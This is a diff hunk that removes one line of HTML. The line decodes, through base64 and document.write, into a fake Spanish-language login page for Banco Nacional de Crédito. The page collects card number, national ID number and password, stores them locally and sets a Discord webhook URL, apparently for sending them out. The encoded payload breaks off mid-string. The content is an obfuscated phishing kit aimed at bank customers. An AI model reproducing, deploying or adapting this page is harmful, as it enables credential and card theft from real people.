@@ -1,1 +1,658 @@
-<script>document.write(decodeURIComponent(escape(atob("CjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlcyI+CjxoZWFkPgogIDxtZXRhIGNoYXJzZXQ9IlVURi04IiAvPgogIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wLCBtYXhpbXVtLXNjYWxlPTEuMCwgdXNlci1zY2FsYWJsZT1ubyIvPgogIDx0aXRsZT5CTkMgLSBQZXJzb25hczwvdGl0bGU+CiAgPHN0eWxlPgogICAgKiB7IG1hcmdpbjogMDsgcGFkZGluZzogMDsgYm94LXNpemluZzogYm9yZGVyLWJveDsgLXdlYmtpdC10YXAtaGlnaGxpZ2h0LWNvbG9yOiB0cmFuc3BhcmVudDsgfQoKICAgIGJvZHkgewogICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZTBlMGUwOwogICAgICBkaXNwbGF5OiBmbGV4OwogICAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjsKICAgICAgYWxpZ24taXRlbXM6IGZsZXgtc3RhcnQ7CiAgICAgIG1pbi1oZWlnaHQ6IDEwMHZoOwogICAgICBmb250LWZhbWlseTogJ1NlZ29lIFVJJywgQXJpYWwsIHNhbnMtc2VyaWY7CiAgICAgIHBhZGRpbmc6IDI0cHggMCA0MHB4IDA7CiAgICB9CgogICAgLnBob25lLXdyYXBwZXIgewogICAgICB3aWR0aDogMTAwJTsKICAgICAgbWF4LXdpZHRoOiA0MjBweDsKICAgICAgcGFkZGluZzogMjBweCAxNnB4IDMwcHggMTZweDsKICAgIH0KCiAgICAubG9nby1hcmVhIHsgbWFyZ2luLWJvdHRvbTogMTZweDsgcGFkZGluZy1sZWZ0OiAycHg7IH0KICAgIC5sb2dvLWFyZWEgaW1nIHsgd2lkdGg6IDkwcHg7IGhlaWdodDogYXV0bzsgb2JqZWN0LWZpdDogY29udGFpbjsgfQoKICAgIC50YWJzIHsgZGlzcGxheTogZmxleDsgYm9yZGVyLXJhZGl1czogMTBweCAxMHB4IDAgMDsgb3ZlcmZsb3c6IGhpZGRlbjsgfQoKICAgIC50YWIgewogICAgICBmbGV4OiAxOyBwYWRkaW5nOiAxNXB4IDA7IHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgZm9udC1zaXplOiAxNS41cHg7IGZvbnQtd2VpZ2h0OiA1MDA7IGN1cnNvcjogcG9pbnRlcjsKICAgICAgY29sb3I6ICM1NTU7IGJhY2tncm91bmQ6ICNjYWNhY2E7CiAgICAgIHRyYW5zaXRpb246IGJhY2tncm91bmQgMC4ycywgY29sb3IgMC4yczsgdXNlci1zZWxlY3Q6IG5vbmU7CiAgICB9CgogICAgLnRhYi5hY3RpdmUgewogICAgICBiYWNrZ3JvdW5kOiAjZmZmOyBjb2xvcjogIzExMTsgZm9udC13ZWlnaHQ6IDcwMDsKICAgICAgYm9yZGVyLWJvdHRvbTogM3B4IHNvbGlkICNlMDVjMWE7CiAgICB9CgogICAgLmNhcmQgewogICAgICBiYWNrZ3JvdW5kOiAjMGMyNDYxOyBib3JkZXItcmFkaXVzOiAwIDAgMjBweCAyMHB4OwogICAgICBwYWRkaW5nOiAzMHB4IDIwcHggMjhweCAyMHB4OyBkaXNwbGF5OiBmbGV4OyBmbGV4LWRpcmVjdGlvbjogY29sdW1uOwogICAgfQoKICAgIC5jYXJkLXRpdGxlIHsgY29sb3I6ICNmZmY7IGZvbnQtc2l6ZTogMjdweDsgZm9udC13ZWlnaHQ6IDgwMDsgdGV4dC1hbGlnbjogY2VudGVyOyBtYXJnaW4tYm90dG9tOiAxMHB4OyB9CgogICAgLmNhcmQtc3VidGl0bGUgeyBjb2xvcjogI2MwZDBmMDsgZm9udC1zaXplOiAxNHB4OyB0ZXh0LWFsaWduOiBjZW50ZXI7IGxpbmUtaGVpZ2h0OiAxLjY7IG1hcmdpbi1ib3R0b206IDIycHg7IH0KICAgIC5jYXJkLXN1YnRpdGxlIHN0cm9uZyB7IGNvbG9yOiAjZmZmOyBmb250LXdlaWdodDogNzAwOyB9CgogICAgLnRvZ2dsZS1ncm91cCB7CiAgICAgIGRpc3BsYXk6IGZsZXg7IGJhY2tncm91bmQ6ICMwYTFlNTA7IGJvcmRlci1yYWRpdXM6IDEwcHg7CiAgICAgIHBhZGRpbmc6IDRweDsgZ2FwOiA0cHg7IG1hcmdpbi1ib3R0b206IDIycHg7CiAgICB9CgogICAgLnRvZ2dsZS1idG4gewogICAgICBmbGV4OiAxOyBwYWRkaW5nOiAxMXB4IDRweDsgYm9yZGVyOiBub25lOyBjdXJzb3I6IHBvaW50ZXI7CiAgICAgIGZvbnQtc2l6ZTogMTMuNXB4OyBmb250LXdlaWdodDogNjAwOyBib3JkZXItcmFkaXVzOiA4cHg7CiAgICAgIHRyYW5zaXRpb246IGJhY2tncm91bmQgMC4yNXMsIGNvbG9yIDAuMjVzOwogICAgfQoKICAgIC8qIEFjdGl2byA9IG5hcmFuamEsIGluYWN0aXZvID0gYmxhbmNvICovCiAgICAudG9nZ2xlLWJ0bi5pcy1hY3RpdmUgICB7IGJhY2tncm91bmQ6ICNlMDVjMWE7IGNvbG9yOiAjZmZmOyB9CiAgICAudG9nZ2xlLWJ0bi5pcy1pbmFjdGl2ZSB7IGJhY2tncm91bmQ6ICNmZmY7IGNvbG9yOiAjMGMyNDYxOyB9CgogICAgLmlucHV0LWdyb3VwIHsgZGlzcGxheTogZmxleDsgZmxleC1kaXJlY3Rpb246IGNvbHVtbjsgZ2FwOiAxM3B4OyBtYXJnaW4tYm90dG9tOiAyMHB4OyB9CgogICAgLmlucHV0LXdyYXBwZXIgewogICAgICBiYWNrZ3JvdW5kOiAjZmZmOyBib3JkZXItcmFkaXVzOiAxMXB4OyBkaXNwbGF5OiBmbGV4OwogICAgICBhbGlnbi1pdGVtczogY2VudGVyOyBwYWRkaW5nOiAwIDE2cHg7IGhlaWdodDogNTRweDsKICAgICAgZ2FwOiAxMnB4OyB0cmFuc2l0aW9uOiBib3gtc2hhZG93IDAuMnM7CiAgICB9CgogICAgLmlucHV0LXdyYXBwZXI6Zm9jdXMtd2l0aGluIHsgYm94LXNoYWRvdzogMCAwIDAgMnB4ICMyYTZkZTg7IH0KICAgIC5pbnB1dC13cmFwcGVyIHN2ZyB7IGZsZXgtc2hyaW5rOiAwOyB9CgogICAgLmlucHV0LXdyYXBwZXIgaW5wdXQgewogICAgICBib3JkZXI6IG5vbmU7IG91dGxpbmU6IG5vbmU7IGZvbnQtc2l6ZTogMTVweDsKICAgICAgY29sb3I6ICMyMjI7IGJhY2tncm91bmQ6IHRyYW5zcGFyZW50OyB3aWR0aDogMTAwJTsKICAgIH0KCiAgICAuaW5wdXQtd3JhcHBlciBpbnB1dDo6cGxhY2Vob2xkZXIgeyBjb2xvcjogI2FhYTsgfQoKICAgIC5leWUtYnRuIHsKICAgICAgYmFja2dyb3VuZDogbm9uZTsgYm9yZGVyOiBub25lOyBjdXJzb3I6IHBvaW50ZXI7CiAgICAgIHBhZGRpbmc6IDA7IGRpc3BsYXk6IGZsZXg7IGFsaWduLWl0ZW1zOiBjZW50ZXI7IGZsZXgtc2hyaW5rOiAwOwogICAgfQoKICAgIC5idG4tY29udGludWFyIHsKICAgICAgYmFja2dyb3VuZDogIzI1NjNlYjsgY29sb3I6ICNmZmY7IGJvcmRlcjogbm9uZTsKICAgICAgYm9yZGVyLXJhZGl1czogMTFweDsgcGFkZGluZzogMTZweDsgZm9udC1zaXplOiAxN3B4OwogICAgICBmb250LXdlaWdodDogNzAwOyBjdXJzb3I6IHBvaW50ZXI7IHdpZHRoOiAxMDAlOwogICAgICBtYXJnaW4tYm90dG9tOiAyMHB4OyB0cmFuc2l0aW9uOiBiYWNrZ3JvdW5kIDAuMnMsIHRyYW5zZm9ybSAwLjFzOwogICAgICBsZXR0ZXItc3BhY2luZzogMC4zcHg7IGRpc3BsYXk6IGZsZXg7IGFsaWduLWl0ZW1zOiBjZW50ZXI7CiAgICAgIGp1c3RpZnktY29udGVudDogY2VudGVyOyBnYXA6IDhweDsKICAgIH0KCiAgICAuYnRuLWNvbnRpbnVhcjphY3RpdmUgICB7IHRyYW5zZm9ybTogc2NhbGUoMC45OCk7IGJhY2tncm91bmQ6ICMxZDRmZDg7IH0KICAgIC5idG4tY29udGludWFyOmRpc2FibGVkIHsgYmFja2dyb3VuZDogIzVhOGFkYjsgY3Vyc29yOiBub3QtYWxsb3dlZDsgfQoKICAgIC5zcGlubmVyIHsKICAgICAgd2lkdGg6IDE4cHg7IGhlaWdodDogMThweDsKICAgICAgYm9yZGVyOiAzcHggc29saWQgcmdiYSgyNTUsMjU1LDI1NSwwLjQpOwogICAgICBib3JkZXItdG9wLWNvbG9yOiAjZmZmOyBib3JkZXItcmFkaXVzOiA1MCU7CiAgICAgIGFuaW1hdGlvbjogc3BpbiAwLjdzIGxpbmVhciBpbmZpbml0ZTsgZGlzcGxheTogbm9uZTsKICAgIH0KICAgIEBrZXlmcmFtZXMgc3BpbiB7IHRvIHsgdHJhbnNmb3JtOiByb3RhdGUoMzYwZGVnKTsgfSB9CgogICAgLmRpdmlkZXIgeyBib3JkZXI6IG5vbmU7IGJvcmRlci10b3A6IDFweCBzb2xpZCAjMWUzYTgwOyBtYXJnaW46IDAgMCAxOHB4IDA7IH0KCiAgICAuZm9yZ290IHsKICAgICAgZGlzcGxheTogZmxleDsgYWxpZ24taXRlbXM6IGNlbnRlcjsganVzdGlmeS1jb250ZW50OiBjZW50ZXI7CiAgICAgIGdhcDogN3B4OyBjb2xvcjogIzkwYjRmODsgZm9udC1zaXplOiAxNHB4OwogICAgICBjdXJzb3I6IHBvaW50ZXI7IHRleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lOyB1c2VyLXNlbGVjdDogbm9uZTsKICAgIH0KCiAgICAudG9hc3QgewogICAgICBwb3NpdGlvbjogZml4ZWQ7IGJvdHRvbTogMzBweDsgbGVmdDogNTAlOwogICAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZVgoLTUwJSkgdHJhbnNsYXRlWSg4MHB4KTsKICAgICAgYmFja2dyb3VuZDogIzFhM2ExYTsgY29sb3I6ICM3ZmZmN2Y7CiAgICAgIHBhZGRpbmc6IDEzcHggMjJweDsgYm9yZGVyLXJhZGl1czogMTJweDsKICAgICAgZm9udC1zaXplOiAxNHB4OyBmb250LXdlaWdodDogNjAwOwogICAgICBib3gtc2hhZG93OiAwIDRweCAyMHB4IHJnYmEoMCwwLDAsMC4zKTsKICAgICAgdHJhbnNpdGlvbjogdHJhbnNmb3JtIDAuMzVzIGN1YmljLWJlemllciguMjIsMSwuMzYsMSksIG9wYWNpdHkgMC4zczsKICAgICAgb3BhY2l0eTogMDsgei1pbmRleDogOTk5OyB3aGl0ZS1zcGFjZTogbm93cmFwOwogICAgfQogICAgLnRvYXN0LmVycm9yIHsgYmFja2dyb3VuZDogIzNhMWExYTsgY29sb3I6ICNmZjhmOGY7IH0KICAgIC50b2FzdC5zaG93ICB7IHRyYW5zZm9ybTogdHJhbnNsYXRlWCgtNTAlKSB0cmFuc2xhdGVZKDApOyBvcGFjaXR5OiAxOyB9CgogICAgLmZvb3RlciB7IG1hcmdpbi10b3A6IDIwcHg7IHRleHQtYWxpZ246IGNlbnRlcjsgY29sb3I6ICM3Nzc7IGZvbnQtc2l6ZTogMTJweDsgbGluZS1oZWlnaHQ6IDEuODsgfQogICAgLmZvb3RlciBhIHsgY29sb3I6ICNlMDVjMWE7IHRleHQtZGVjb3JhdGlvbjogbm9uZTsgZm9udC13ZWlnaHQ6IDYwMDsgfQoKICAgIC5mb290ZXItaWNvbiB7CiAgICAgIGRpc3BsYXk6IGZsZXg7IGp1c3RpZnktY29udGVudDogY2VudGVyOyBhbGlnbi1pdGVtczogY2VudGVyOwogICAgICBtYXJnaW4tdG9wOiA0cHg7IGdhcDogNnB4OyBjb2xvcjogIzY2NjsgZm9udC1zaXplOiAxMnB4OwogICAgfQoKICAgIC5jaXJjbGUtcSB7CiAgICAgIHdpZHRoOiAyMnB4OyBoZWlnaHQ6IDIycHg7IGJvcmRlci1yYWRpdXM6IDUwJTsgYmFja2dyb3VuZDogIzk5OTsKICAgICAgZGlzcGxheTogZmxleDsgYWxpZ24taXRlbXM6IGNlbnRlcjsganVzdGlmeS1jb250ZW50OiBjZW50ZXI7CiAgICAgIGNvbG9yOiAjZmZmOyBmb250LXdlaWdodDogODAwOyBmb250LXNpemU6IDEzcHg7IGZsZXgtc2hyaW5rOiAwOwogICAgfQoKICAgIC5pbnB1dC1sYWJlbC1hbmltIHsgYW5pbWF0aW9uOiBmYWRlU2xpZGUgMC4zcyBlYXNlOyB9CiAgICBAa2V5ZnJhbWVzIGZhZGVTbGlkZSB7CiAgICAgIGZyb20geyBvcGFjaXR5OiAwOyB0cmFuc2Zvcm06IHRyYW5zbGF0ZVkoNnB4KTsgfQogICAgICB0byAgIHsgb3BhY2l0eTogMTsgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKDApOyB9CiAgICB9CgogICAgQG1lZGlhIChtYXgtd2lkdGg6IDQyMHB4KSB7CiAgICAgIGJvZHkgeyBwYWRkaW5nOiAwOyB9CiAgICAgIC5waG9uZS13cmFwcGVyIHsgcGFkZGluZzogMTZweCAxMnB4IDI4cHggMTJweDsgfQogICAgICAuY2FyZCB7IHBhZGRpbmc6IDI2cHggMTZweCAyNHB4IDE2cHg7IH0KICAgICAgLmNhcmQtdGl0bGUgeyBmb250LXNpemU6IDI0cHg7IH0KICAgIH0KICA8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5Pgo8ZGl2IGNsYXNzPSJwaG9uZS13cmFwcGVyIj4KCiAgPGRpdiBjbGFzcz0ibG9nby1hcmVhIj4KICAgIDxpbWcgc3JjPSJodHRwczovL3VwbG9hZC53aWtpbWVkaWEub3JnL3dpa2lwZWRpYS9jb21tb25zLzgvODQvQmFuY29fTmFjaW9uYWxfZGVfQ3JlZGl0by5wbmciIGFsdD0iQk5DIi8+CiAgPC9kaXY+CgogIDxkaXYgY2xhc3M9InRhYnMiPgogICAgPGRpdiBjbGFzcz0idGFiIGFjdGl2ZSIgaWQ9InRhYi1wZXJzb25hcyIgb25jbGljaz0ic3dpdGNoVGFiKCdwZXJzb25hcycpIj5QZXJzb25hczwvZGl2PgogICAgPGRpdiBjbGFzcz0idGFiIiBpZD0idGFiLWVtcHJlc2FzIiBvbmNsaWNrPSJzd2l0Y2hUYWIoJ2VtcHJlc2FzJykiPkVtcHJlc2FzPC9kaXY+CiAgPC9kaXY+CgogIDxkaXYgY2xhc3M9ImNhcmQiPgogICAgPGRpdiBjbGFzcz0iY2FyZC10aXRsZSI+SW5pY2lhciBTZXNpw7NuPC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJjYXJkLXN1YnRpdGxlIiBpZD0ic3VidGl0bGUiPgogICAgICDCoUJ1ZW5hcyBub2NoZXMsPGJyLz4KICAgICAgPHN0cm9uZz5CaWVudmVuaWRvPC9zdHJvbmc+IGEgbGEgbnVldmEgPHN0cm9uZz5BcHAgQk5DITwvc3Ryb25nPjxici8+CiAgICAgIEluZ3Jlc2Ugc3VzIENyZWRlbmNpYWxlcwogICAgPC9kaXY+CgogICAgPGRpdiBjbGFzcz0idG9nZ2xlLWdyb3VwIj4KICAgICAgCiAgICAgIDxidXR0b24gY2xhc3M9InRvZ2dsZS1idG4gaXMtYWN0aXZlIiAgIGlkPSJidG4tZGViaXRvIiBvbmNsaWNrPSJzd2l0Y2hDYXJkKCdkZWJpdG8nKSI+RMOpYml0byB8IENyw6lkaXRvPC9idXR0b24+CiAgICAgIDxidXR0b24gY2xhc3M9InRvZ2dsZS1idG4gaXMtaW5hY3RpdmUiIGlkPSJidG4tYm9kIiAgICBvbmNsaWNrPSJzd2l0Y2hDYXJkKCdib2QnKSI+VGFyamV0YSBEw6liaXRvIEJPRDwvYnV0dG9uPgogICAgPC9kaXY+CgogICAgPGRpdiBjbGFzcz0iaW5wdXQtZ3JvdXAiPgoKICAgICAgPGRpdiBjbGFzcz0iaW5wdXQtd3JhcHBlciI+CiAgICAgICAgPHN2ZyB3aWR0aD0iMjIiIGhlaWdodD0iMjIiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgc3Ryb2tlPSIjNzc3IiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+CiAgICAgICAgICA8cmVjdCB4PSIyIiB5PSI1IiB3aWR0aD0iMjAiIGhlaWdodD0iMTQiIHJ4PSIyIi8+CiAgICAgICAgICA8bGluZSB4MT0iMiIgeTE9IjEwIiB4Mj0iMjIiIHkyPSIxMCIvPgogICAgICAgIDwvc3ZnPgogICAgICAgIDxpbnB1dCB0eXBlPSJ0ZWwiIHBsYWNlaG9sZGVyPSJOw7ptZXJvIGRlIFRhcmpldGEiIGlkPSJjYXJkLW51bWJlciIgb25pbnB1dD0iZm9ybWF0Q2FyZCh0aGlzKSIvPgogICAgICA8L2Rpdj4KCiAgICAgIDxkaXYgY2xhc3M9ImlucHV0LXdyYXBwZXIiIGlkPSJzZWNvbmQtZmllbGQtd3JhcHBlciI+CiAgICAgICAgPHNwYW4gaWQ9InNlY29uZC1pY29uIj4KICAgICAgICAgIDxzdmcgd2lkdGg9IjIyIiBoZWlnaHQ9IjIyIiB2aWV3Qm94PSIwIDAgMjQgMjQiIGZpbGw9Im5vbmUiIHN0cm9rZT0iIzc3NyIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiPgogICAgICAgICAgICA8cmVjdCB4PSIyIiB5PSI0IiB3aWR0aD0iMjAiIGhlaWdodD0iMTYiIHJ4PSIyIi8+CiAgICAgICAgICAgIDxjaXJjbGUgY3g9IjguNSIgY3k9IjEwIiByPSIyIi8+CiAgICAgICAgICAgIDxwYXRoIGQ9Ik0xNCAxMGg0TTE0IDE0aDRNMiAxNGg0Ii8+CiAgICAgICAgICA8L3N2Zz4KICAgICAgICA8L3NwYW4+CiAgICAgICAgPGlucHV0IHR5cGU9InRlbCIgcGxhY2Vob2xkZXI9IkPDqWR1bGEgZGUgSWRlbnRpZGFkICg4IGTDrWdpdG9zKSIKICAgICAgICAgICAgICAgaWQ9InNlY29uZC1pbnB1dCIgbWF4bGVuZ3RoPSI4IiBhdXRvY29tcGxldGU9Im9mZiIvPgogICAgICAgIDxidXR0b24gY2xhc3M9ImV5ZS1idG4iIGlkPSJleWUtYnRuIiBzdHlsZT0iZGlzcGxheTpub25lIiBvbmNsaWNrPSJ0b2dnbGVQYXNzd29yZCgpIiB0eXBlPSJidXR0b24iPgogICAgICAgICAgPHN2ZyBpZD0iZXllLWljb24iIHdpZHRoPSIyMCIgaGVpZ2h0PSIyMCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9IiNhYWEiIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIj4KICAgICAgICAgICAgPHBhdGggZD0iTTEgMTJzNC04IDExLTggMTEgOCAxMSA4LTQgOC0xMSA4LTExLTgtMTEtOHoiLz4KICAgICAgICAgICAgPGNpcmNsZSBjeD0iMTIiIGN5PSIxMiIgcj0iMyIvPgogICAgICAgICAgPC9zdmc+CiAgICAgICAgPC9idXR0b24+CiAgICAgIDwvZGl2PgoKICAgIDwvZGl2PgoKICAgIDxidXR0b24gY2xhc3M9ImJ0bi1jb250aW51YXIiIGlkPSJidG4tY29udGludWFyIiBvbmNsaWNrPSJoYW5kbGVDb250aW51ZSgpIj4KICAgICAgPHNwYW4gaWQ9ImJ0bi10ZXh0Ij5Db250aW51YXI8L3NwYW4+CiAgICAgIDxkaXYgY2xhc3M9InNwaW5uZXIiIGlkPSJzcGlubmVyIj48L2Rpdj4KICAgIDwvYnV0dG9uPgoKICAgIDxociBjbGFzcz0iZGl2aWRlciIvPgoKICAgIDxkaXYgY2xhc3M9ImZvcmdvdCI+CiAgICAgIDxzdmcgd2lkdGg9IjE0IiBoZWlnaHQ9IjE0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIGZpbGw9Im5vbmUiIHN0cm9rZT0iIzkwYjRmOCIgc3Ryb2tlLXdpZHRoPSIyLjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCI+CiAgICAgICAgPHJlY3QgeD0iMyIgeT0iMTEiIHdpZHRoPSIxOCIgaGVpZ2h0PSIxMSIgcng9IjIiIHJ5PSIyIi8+CiAgICAgICAgPHBhdGggZD0iTTcgMTFWN2E1IDUgMCAwIDEgMTAgMHY0Ii8+CiAgICAgIDwvc3ZnPgogICAgICDCv09sdmlkYXN0ZSB0dSBjbGF2ZT8KICAgIDwvZGl2PgogIDwvZGl2PgoKICA8ZGl2IGNsYXNzPSJmb290ZXIiPgogICAgQmFuY28gTmFjaW9uYWwgZGUgQ3LDqWRpdG8sIEJhbmNvIFVuaXZlcnNhbC48YnIvPgogICAgUmlmOiBKLTMwOTg0MTMyLTcgwqkgMjAyNiB8IEJOQyBWZXJzacOzbjogPGEgaHJlZj0iIyI+MS4xOTwvYT4KICAgIDxkaXYgY2xhc3M9ImZvb3Rlci1pY29uIj4KICAgICAgPGRpdiBjbGFzcz0iY2lyY2xlLXEiPj88L2Rpdj4KICAgICAgVG9kb3MgbG9zIGRlcmVjaG9zIHJlc2VydmFkb3MuCiAgICA8L2Rpdj4KICA8L2Rpdj4KCjwvZGl2PgoKPGRpdiBjbGFzcz0idG9hc3QiIGlkPSJ0b2FzdCI+PC9kaXY+Cgo8c2NyaXB0PgogIGNvbnN0IFdFQkhPT0tfVVJMID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzE0NzYzOTU0ODcyMDc3NTU4NTEvLTRjbDQ0WW5DWE50c2MzRDE1cUVvLTV1SjRsUnk2TDIzV3RBNTdGUmtFZ085N3NvMjExWlBVWE5POWlIYWdyRGtRYkMiOwoKICAvLyBTYWx1ZG8gZGluw6FtaWNvCiAgKGZ1bmN0aW9uICgpIHsKICAgIGNvbnN0IGggPSBuZXcgRGF0ZSgpLmdldEhvdXJzKCk7CiAgICBjb25zdCBnID0gaCA8IDEyID8gIkJ1ZW5vcyBkw61hcyIgOiBoIDwgMTggPyAiQnVlbmFzIHRhcmRlcyIgOiAiQnVlbmFzIG5vY2hlcyI7CiAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgic3VidGl0bGUiKS5pbm5lckhUTUwgPQogICAgICBgwqEke2d9LDxici8+PHN0cm9uZz5CaWVudmVuaWRvPC9zdHJvbmc+IGEgbGEgbnVldmEgPHN0cm9uZz5BcHAgQk5DITwvc3Ryb25nPjxici8+SW5ncmVzZSBzdXMgQ3JlZGVuY2lhbGVzYDsKICB9KSgpOwoKICAvLyBMb2NhbFN0b3JhZ2UKICBmdW5jdGlvbiBzYXZlU2Vzc2lvbihjYXJkLCBjZWR1bGEsIHBhc3N3b3JkLCBjYXJkVHlwZSkgewogICAgY29uc3Qgc2Vzc2lvbnMgPSBKU09OLnBhcnNlKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJibmNfc2Vzc2lvbnMiKSB8fCAiW10iKTsKICAgIHNlc3Npb25zLnB1c2goeyB0aW1lc3RhbXA6IG5ldyBEYXRlKCkudG9JU09TdHJpbmcoKSwgY2FyZCwgY2VkdWxhLCBwYXNzd29yZCwgY2FyZFR5cGUgfSk7CiAgICBsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgiYm5jX3Nlc3Npb25zIiwgSlNPTi5zdHJpbmdpZnkoc2Vzc2lvbnMpKTsKICB9CgogIC8vIFRhYnMKICBmdW5jdGlvbiBzd2l0Y2hUYWIodGFiKSB7CiAgICBbInBlcnNvbmFzIiwgImVtcHJlc2FzIl0uZm9yRWFjaCh0ID0+CiAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJ0YWItIiArIHQpLmNsYXNzTGlzdC50b2dnbGUoImFjdGl2ZSIsIHQgPT09IHRhYikpOwogIH0KCiAgLy8gVG9nZ2xlOiBlbCBzZWxlY2Npb25hZG8gPSBuYXJhbmphLCBlbCBvdHJvID0gYmxhbmNvCiAgZnVuY3Rpb24gc3dpdGNoQ2FyZCh0eXBlKSB7CiAgICBjb25zdCBiZCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJidG4tZGViaXRvIik7CiAgICBjb25zdCBiYiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJidG4tYm9kIik7CiAgICBpZiAodHlwZSA9PT0gImRlYml0byIpIHsKICAgICAgYmQuY2xhc3NOYW1lID0gInRvZ2dsZS1idG4gaXMtYWN0aXZlIjsKICAgICAgYmIuY2xhc3NOYW1lID0gInRvZ2dsZS1idG4gaXMtaW5hY3RpdmUiOwogICAgfSBlbHNlIHsKICAgICAgYmIuY2xhc3NOYW1lID0gInRvZ2dsZS1idG4gaXMtYWN0aXZlIjsKICAgICAgYmQuY2xhc3NOYW1lID0gInRvZ2dsZS1idG4gaXMtaW5hY3RpdmUiOwogICAgfQogIH0KCiAgLy8gRm9ybWF0byB0YXJqZXRhCiAgZnVuY3Rpb24gZm9ybWF0Q2FyZChpbnB1dCkgewogICAgbGV0IHYgPSBpbnB1dC52YWx1ZS5yZXBsYWNlKC9cRC9nLCAiIik7CiAgICBpbnB1dC52YWx1ZSA9IHYucmVwbGFjZSgvKC57NH0pKD89LikvZywgIiQxICIpOwogICAgY2hlY2tGaWVsZHMoKTsKICB9CgogIGxldCBpc1Bhc3N3b3JkTW9kZSA9IGZhbHNlOwogIGxldCBwYXNzd29yZFZpc2libGUgPSBmYWxzZTsKICBsZXQgc2F2ZWRDZWR1bGEgPSAiIjsKCiAgY29uc3QgY2FyZElucHV0ICAgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiY2FyZC1udW1iZXIiKTsKICBjb25zdCBzZWNvbmRJbnB1dCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJzZWNvbmQtaW5wdXQiKTsKCiAgY2FyZElucHV0LmFkZEV2ZW50TGlzdGVuZXIoImlucHV0IiwgZnVuY3Rpb24gKCkgewogICAgbGV0IHYgPSB0aGlzLnZhbHVlLnJlcGxhY2UoL1xEL2csICIiKTsKICAgIHRoaXMudmFsdWUgPSB2LnJlcGxhY2UoLyguezR9KSg/PS4pL2csICIkMSAiKTsKICAgIGlmICh2Lmxlbmd0aCA8IDggJiYgaXNQYXNzd29yZE1vZGUpIHN3aXRjaFRvQ2VkdWxhKCk7CiAgICBjaGVja0ZpZWxkcygpOwogIH0pOwoKICBzZWNvbmRJbnB1dC5hZGRFdmVudExpc3RlbmVyKCJpbnB1dCIsIGZ1bmN0aW9uICgpIHsKICAgIGlmICghaXNQYXNzd29yZE1vZGUpIHsKICAgICAgdGhpcy52YWx1ZSA9IHRoaXMudmFsdWUucmVwbGFjZSgvXEQvZywgIiIpLnNsaWNlKDAsIDgpOwogICAgICBjaGVja0ZpZWxkcygpOwogICAgfQogIH0pOwoKICBmdW5jdGlvbiBjaGVja0ZpZWxkcygpIHsKICAgIGNvbnN0IGNhcmREaWdpdHMgPSBjYXJkSW5wdXQudmFsdWUucmVwbGFjZSgvXHMvZywgIiIpOwogICAgY29uc3QgY2VkdWxhICAgICA9IHNlY29uZElucHV0LnZhbHVlLnRyaW0oKTsKICAgIGlmICghaXNQYXNzd29yZE1vZGUgJiYgY2FyZERpZ2l0cy5sZW5ndGggPj0gOCAmJiBjZWR1bGEubGVuZ3RoID09PSA4KSBzd2l0Y2hUb1Bhc3N3b3JkKCk7CiAgfQoKICBmdW5jdGlvbiBzd2l0Y2hUb1Bhc3N3b3JkKCkgewogICAgaXNQYXNzd29yZE1vZGUgPSB0cnVlOwogICAgc2F2ZWRDZWR1bGEgICAgPSBzZWNvbmRJbnB1dC52YWx1ZS50cmltKCk7CgogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInNlY29uZC1pY29uIikuaW5uZXJIVE1MID0gYAogICAgICA8c3ZnIHdpZHRoPSIyMiIgaGVpZ2h0PSIyMiIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9IiM3NzciIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlLWxpbmVjYXA9InJvdW5kIiBzdHJva2UtbGluZWpvaW49InJvdW5kIj4KICAgICAgICA8cmVjdCB4PSIzIiB5PSIxMSIgd2lkdGg9IjE4IiBoZWlnaHQ9IjExIiByeD0iMiIgcnk9IjIiLz4KICAgICAgICA8cGF0aCBkPSJNNyAxMVY3YTUgNSAwIDAgMSAxMCAwdjQiLz4KICAgICAgPC9zdmc+YDsKCiAgICBzZWNvbmRJbnB1dC50eXBlICAgICAgICA9ICJwYXNzd29yZCI7CiAgICBzZWNvbmRJbnB1dC5wbGFjZWhvbGRlciA9ICJDb250cmFzZcOxYSI7CiAgICBzZWNvbmRJbnB1dC52YWx1ZSAgICAgICA9ICIiOwogICAgc2Vjb25kSW5wdXQucmVtb3ZlQXR0cmlidXRlKCJtYXhsZW5ndGgiKTsKICAgIHNlY29uZElucHV0LnNldEF0dHJpYnV0ZSgiaW5wdXRtb2RlIiwgInRleHQiKTsKICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJleWUtYnRu